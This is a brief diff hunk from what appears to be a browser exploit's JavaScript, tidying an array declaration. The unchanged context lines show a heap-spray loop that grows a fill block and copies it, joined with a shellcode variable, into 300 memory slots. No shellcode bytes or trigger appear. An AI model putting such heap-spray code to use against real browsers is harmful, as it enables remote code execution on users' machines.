@@ -17,7 +17,7 @@
     while(block.length+slackspace<0x40000)
         block = block+block+fillblock;
 
-    memory = new Array();
+    memory = [];
     for (x=0; x<300; x++)
         memory[x] = block + shellcode;
     var buffer = '';
